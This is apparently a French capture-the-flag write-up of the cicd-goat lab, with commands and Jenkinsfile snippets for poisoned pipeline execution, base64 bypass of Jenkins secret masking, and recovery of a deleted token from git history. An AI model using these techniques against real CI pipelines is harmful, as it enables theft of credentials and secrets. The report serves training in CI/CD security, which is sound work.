# Rapport méthodologique — CTF Wonderland (cicd-goat) — Partie 1
**Session du 21/07/2026 — Challenges 1 à 4**

Environnement : Gitea (`localhost:3000`), Jenkins (`localhost:8080`), GitLab (`localhost:4000`), CTFd (`localhost:8000`). Compte principal : `alice` / `thealice`.

---

## Challenge 1 — White Rabbit ✅ Résolu
**Objectif** : voler le secret `flag1` stocké dans le credential store Jenkins via le repo `Wonderland/white-rabbit`.

**Constat initial** : le `Jenkinsfile` du repo n'utilisait aucun credential. La branche `main` était protégée (push direct refusé par Gitea).

**Méthode** :
1. Clone du repo :
   ```bash
   git clone http://thealice:thealice@localhost:3000/Wonderland/white-rabbit.git
   cd white-rabbit
   ```
2. Création d'une branche non protégée :
   ```bash
   git checkout -b steal-secret
   ```
3. Ajout d'un stage Jenkins injectant le credential `flag1` (type `string`) dans le `Jenkinsfile` :
   ```groovy
   stage('Steal') {
       steps {
           withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
               sh 'echo $SECRET'
           }
       }
   }
   ```
4. Commit et push :
   ```bash
   git add Jenkinsfile
   git commit -m "debug pipeline"
   git push origin steal-secret
   ```
5. Création d'une **Pull Request** `steal-secret → main` sur Gitea (interface web).
6. Scan du job Jenkins pour détecter la PR : bouton **"Scan Pipeline Multibranches Now"** sur le job `wonderland-white-rabbit`.
7. Constat du masquage automatique du secret dans les logs (`+ echo ****`). Contournement par encodage :
   ```groovy
   sh 'echo $SECRET | base64'
   ```
8. Commit/push de la correction :
   ```bash
   git add Jenkinsfile
   git commit -m "update"
   git push origin steal-secret
   ```
9. Lecture du build déclenché automatiquement sur la PR → **Sortie console**.
10. Décodage local du résultat base64 :
    ```powershell
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<valeur_base64>"))
    ```

**Technique** : *Poisoned Pipeline Execution* (directe, via PR) + contournement du masquage de credentials Jenkins par encodage.

---

## Challenge 2 — Mad Hatter ✅ Résolu
**Objectif** : trouver le secret associé au repo `Wonderland/mad-hatter`.

**Constat initial** : le repo `mad-hatter` (projet `yagmail`) ne contient aucun Jenkinsfile. Le job Jenkins `wonderland-mad-hatter` n'affiche aucune branche buildable.

**Découverte clé** : un second repo Gitea, `Wonderland/mad-hatter-pipeline`, contient le vrai `Jenkinsfile` (pattern *Jenkinsfile externe / Remote Jenkinsfile*). Le `Makefile` de `mad-hatter` référence une variable `${FLAG}` injectée par ce pipeline via un credential `flag3`.

**Méthode** :
1. Clone du repo cible :
   ```bash
   git clone http://thealice:thealice@localhost:3000/Wonderland/mad-hatter.git
   cd mad-hatter
   ```
2. Exploration :
   ```bash
   git log --all --oneline
   git grep -i "secret\|token\|api_key\|password"
   ```
3. Recherche du Jenkinsfile / repo pipeline via l'interface Gitea (repo `mad-hatter-pipeline`) et son historique de commits (diff Jenkinsfile) pour identifier le credential `flag3` et le stage `make`.
4. Déclenchement d'une première indexation de branche buildable : création d'un commit vide sur une nouvelle branche.
   ```bash
   git checkout -b trigger-build
   git commit --allow-empty -m "trigger build"
   git push origin trigger-build
   ```
5. Re-scan du job Jenkins (**"Scan Pipeline Multibranches Now"**) sur `wonderland-mad-hatter`.
6. Lecture de la sortie console du build déclenché → identification de l'échec DNS et du masquage du secret dans la commande `curl` du `Makefile`.
7. Modification du `Makefile` pour contourner les deux problèmes :
   ```
   echo ${FLAG} | base64
   ```
8. Commit et push :
   ```bash
   git add Makefile
   git commit -m "update"
   git push origin trigger-build
   ```
9. Lecture du nouveau build (#2) → **Sortie console**.
10. Décodage local :
    ```powershell
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<valeur_base64>"))
    ```

**Technique** : découverte du pattern **Jenkinsfile externe / repo pipeline séparé**, déclenchement manuel d'une première indexation de branche, contournement DNS + masquage via modification d'un script appelé par le pipeline.

---

## Challenge 3 — Duchess ✅ Résolu
**Objectif** : trouver un token laissé dans le repo `Wonderland/duchess` (projet PyJWT).

**Constat initial** : aucun Jenkinsfile, aucun job Jenkins associé, aucune trace dans l'état courant des fichiers. Repo comportant 696 révisions.

**Méthode** :
1. Clone :
   ```bash
   git clone http://thealice:thealice@localhost:3000/Wonderland/duchess.git
   cd duchess
   ```
2. Explorations infructueuses de l'état courant (fichiers CI, config, tests, wiki, issues, PRs) :
   ```bash
   git grep -i "token\|secret\|key\|password"
   git log --all -p | Select-String -Pattern "[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}"
   git fsck --unreachable --no-reflog
   git ls-remote http://thealice:thealice@localhost:3000/Wonderland/duchess.git "refs/*"
   ```
3. Comptage réel des commits :
   ```bash
   git rev-list --count HEAD
   ```
4. Tri chronologique de tous les commits pour repérer une anomalie (commit "intrus" hors historique légitime) :
   ```bash
   git log --all --format="%ad %an %s" --date=short | Sort-Object | Select-Object -Last 15
   ```
5. Récupération du hash du commit suspect identifié ("remove pypi token") :
   ```bash
   git log --all --format="%H %ad %s" --date=short | Select-String "remove pypi token"
   ```
6. Inspection du diff de ce commit :
   ```bash
   git show <hash_du_commit>
   ```
7. Décodage du token PyPI récupéré (segment base64url interne) :
   ```powershell
   $token = "<segment_apres_pypi->"
   $token = $token.Replace('-','+').Replace('_','/')
   while ($token.Length % 4 -ne 0) { $token += "=" }
   [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($token))
   ```

**Technique** : *secret exposure via git history* — un secret supprimé du code reste accessible tant qu'il existe dans un commit de l'historique. Détection par tri chronologique des commits pour repérer un commit "intrus" au milieu d'un historique légitime volumineux (équivalent manuel à un scan `gitleaks`/`trufflehog`).

---

## Challenge 4 — Caterpillar ⏸️ Non résolu (assistance formateur)
**Objectif** : compromettre le pipeline du repo `Wonderland/caterpillar` sans accès en écriture directe sur `main`.

**Contexte technique établi** :
- Jenkinsfile à la racine, stage `deploy` conditionné à `env.BRANCH_NAME == 'main'`, credential `flag2` (`usernamePassword`).
- Deux jobs Jenkins distincts : `wonderland-caterpillar-test` (scanne les PR) et `wonderland-caterpillar-prod` (scanne uniquement la branche `main` du repo original).

**Méthode suivie (bloquée avant résolution)** :
1. Fork du repo via l'interface Gitea (bouton "Bifurcation").
2. Clone du fork :
   ```bash
   git clone http://thealice:thealice@localhost:3000/thealice/caterpillar.git caterpillar-fork
   cd caterpillar-fork
   ```
3. Modification du Jenkinsfile : suppression du bloc `when` conditionnant le déploiement à `main`, et exfiltration du token en base64 :
   ```groovy
   stage('deploy') {
       steps {
           withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'flag2', passwordVariable: 'TOKEN')]) {
               sh 'echo ${TOKEN} | base64'
           }
       }
   }
   ```
4. Commit et push sur le fork :
   ```bash
   git add Jenkinsfile
   git commit -m "update"
   git push origin main
   ```
5. Création d'une Pull Request `thealice/caterpillar:main → Wonderland/caterpillar:main` via l'interface Gitea.
6. Scan du job `wonderland-caterpillar-test` (**"Scan Pipeline Multibranches Now"**) → PR détectée et buildée (confirmation de l'*Indirect Pipeline Poisoning*), mais échec : credential `flag2` non résolu dans ce scope de job.
7. Vérification du job `wonderland-caterpillar-prod` → ne scanne que la branche `main` du repo original, ignore les PR.

**Point de blocage** : mécanisme reliant le succès des tests de la PR à un déclenchement effectif du job `prod` (webhook Gitea Actions ? auto-merge conditionnel ? scope de credential différent à identifier ?) — non résolu dans cette session, reprise prévue avec l'aide du formateur.

---

## Synthèse des techniques abordées

| Challenge | Technique | Statut |
|---|---|---|
| White Rabbit | Poisoned Pipeline Execution (directe, via PR) | ✅ |
| Mad Hatter | Jenkinsfile externe + déclenchement d'indexation + contournement DNS/masquage | ✅ |
| Duchess | Secret exposure dans l'historique Git (commit "intrus") | ✅ |
| Caterpillar | Indirect Pipeline Poisoning (fork + PR) — bloqué sur la liaison test→prod | ⏸️ |

**Astuce transverse validée** : le masquage automatique des credentials par Jenkins (`****`) se contourne systématiquement en transformant la valeur avant affichage (`echo $SECRET | base64`), car Jenkins ne reconnaît que la valeur brute exacte comme pattern à masquer.

---

*Reste à traiter : Caterpillar (suite), Cheshire Cat, Twiddledum, Dodo, Mock Turtle, Dormouse, Hearts, Gryphon (7 challenges).*
